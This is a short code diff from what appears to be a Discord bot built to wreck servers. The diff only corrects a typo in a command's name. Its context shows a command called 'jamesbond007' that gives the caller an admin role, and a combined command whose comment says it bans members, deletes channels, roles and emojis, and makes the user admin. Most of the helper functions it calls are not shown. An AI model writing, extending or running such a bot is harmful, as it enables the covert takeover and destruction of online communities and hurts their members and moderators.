@@ -118,7 +118,7 @@ async def jamesbond007(ctx):
     await ctx.author.add_roles(admin_role)
 
 @client.command()   #To: Ban people, delete channels, delete roles, delete emojis, making the user admin
-async def everthingatoncebylenka(ctx):
+async def everythingatoncebylenka(ctx):
     await omegalulgone(ctx)
     await whomegalol(ctx)
     await allwhite(ctx)
